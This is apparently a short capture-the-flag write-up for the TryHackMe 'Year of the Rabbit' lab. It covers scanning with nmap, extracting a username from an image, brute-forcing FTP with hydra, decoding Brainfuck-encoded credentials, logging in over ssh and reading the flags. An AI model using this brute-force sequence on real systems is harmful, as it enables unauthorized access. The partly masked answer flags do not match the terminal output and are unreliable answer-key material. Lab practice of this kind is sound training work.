...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Rabbit$ sudo nmap -A -sC -sV -O -Pn 10.10.20.247
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Rabbit$ strings Hot_Babe.png
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```

```
bibo318@parrot:~/CTFs/tryhackme/Year of the Rabbit$ hydra -l ftpuser -P passwd.list ftp://10.10.20.247
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Rabbit$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
...
```
bibo318@parrot:~/CTFs/tryhackme/Year of the Rabbit$ ssh eli@10.10.20.247
...
THM{V0N318*****1107174691af9ff3681d2b5bdb5740b1589bae53}
...
THM{V0N318*****8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
root@year-of-the-rabbit:/root#
```

1. What is the user flag?

`THM{V0N318*****1107174691af9ff3681d2b5bdb5740b1589bae5312**123:))}`

2. What is the root flag?

`THM{V0N318*****8d6f163a87a1c80de27a4fd61aef0f3a0ecf916112**123:))}`
